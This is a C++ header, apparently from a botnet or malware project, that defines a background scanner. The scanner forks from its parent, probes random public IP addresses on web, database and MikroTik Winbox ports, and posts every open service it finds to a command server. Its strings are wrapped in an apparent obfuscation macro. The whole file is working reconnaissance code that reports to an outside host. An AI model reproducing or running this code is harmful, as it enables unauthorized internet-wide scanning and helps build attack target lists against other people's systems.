#ifndef NET_SCANNER_HPP
#define NET_SCANNER_HPP

#include <cstdint>
#include <string>
#include <unistd.h>
#include <arpa/inet.h>

#include "../env.hpp"
#include "net/request.hpp"

#if defined(TALK)
#include <iostream>
#endif

class NETScanner {
  public:
    NETScanner () {
      // Let the parent process continue running on the main thread.
      scanner_pid = fork();
      if (scanner_pid > 0 || scanner_pid == -1)
        return;

      rand_init();

      while (true) {
        std::string new_address = get_random_ip_str();
        const char * new_address_str = new_address.c_str();

        #if defined(TALK)
        std::cout << "Trying: " << new_address << std::endl;
        #endif

        uint16_t active_port;

        if (check_connection(new_address_str, 80))
          report_active_service(new_address_str, 80);
        
        if (check_connection(new_address_str, 443))
          report_active_service(new_address_str, 443);

        if (check_connection(new_address_str, 1433))
          report_active_service(new_address_str, 1433);
        
        if (check_connection(new_address_str, 1521))
          report_active_service(new_address_str, 1521);

        if (check_connection(new_address_str, 3306))
          report_active_service(new_address_str, 3306);

        if (check_connection(new_address_str, 5432))
          report_active_service(new_address_str, 5432);
        
        if (check_connection(new_address_str, 8291))
          report_active_service(new_address_str, 8291);
      }
    }

  private:
    int scanner_pid;
    uint32_t x, y, z, w;

    void report_active_service (const char * address, uint16_t port) {
      #if defined(TALK)
      std::cout << "Service found at: " << address << ":" << std::to_string(port) << std::endl;
      #endif

      std::string payload = "";
      payload += O("{\"address\":\"");
      payload += address;
      payload += O("\",\"port\":\"");
      payload += std::to_string(port);
      payload += O("\"}");

      Request req {
        DOMENA_HOST,
        DOMENA_PORT,
        O("/v1/services"),
        DOMENA_SSL,
        O("POST"),
        payload,
      };
      req.exec();
    }

    uint16_t check_connection (const char * address, uint16_t port) {
      int sock = socket(AF_INET, SOCK_STREAM, 0);
      if (sock < 0) {
        return 0;

        #if defined(TALK)
        std::cout << "Socket creation failed." << std::endl;
        #endif
      }

      struct sockaddr_in serv_addr;
      serv_addr.sin_family = AF_INET;
      serv_addr.sin_port = htons(port);

      int bin_addr = inet_pton(AF_INET, address, &serv_addr.sin_addr);
      if (bin_addr <= 0) {
        return 0;

        #if defined(TALK)
        std::cout << "Failed to transform IP address into binary format." << std::endl;
        #endif
      }

      struct timeval timeout;
      timeout.tv_sec = NET_SCANNER_TIMEOUT;
      timeout.tv_usec = 0;
      
      if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)
        return 0;

      if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0)
        return 0;

      int connection = connect(sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
      if (connection < 0) {
        return 0;
        
        #if defined(TALK)
        std::cout << "Connection refused: " << address << std::endl;
        #endif
      }

      return port;
    }

    void rand_init () {
      x = time(NULL);
      y = getpid() ^ getppid();
      z = clock();
      w = z ^ y;
    }

    uint32_t rand_next () {
      uint32_t t = x;
      t ^= t << 11;
      t ^= t >> 8;
      x = y;
      y = z;
      z = w;
      w ^= w >> 19;
      w ^= t;
      return w;
    }

    std::string get_random_ip_str () {
      uint32_t tmp;
      uint8_t o1, o2, o3, o4;

      do {
        tmp = rand_next();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
      }
      while (
        // 127.0.0.0/8 - Loopback.
        o1 == 127
        // 0.0.0.0/8 - Invalid address space.
        || (o1 == 0)
        // 10.0.0.0/8 - Internal network.
        || (o1 == 10)
        // 192.168.0.0/16 - Internal network.
        || (o1 == 192 && o2 == 168)
        // 172.16.0.0/14 - Internal network.
        || (o1 == 172 && o2 >= 16 && o2 < 32)
        // 100.64.0.0/10 - IANA NAT reserved.
        || (o1 == 100 && o2 >= 64 && o2 < 127)
        // 169.254.0.0/16 - IANA NAT reserved.
        || (o1 == 169 && o2 > 254)
        // 198.18.0.0/15 - IANA Special use.
        || (o1 == 198 && o2 >= 18 && o2 < 20)
        // 224.*.*.* - Multicast.
        || (o1 >= 224)
      );

      return std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
    }
};

#endif // NET_SCANNER_HPP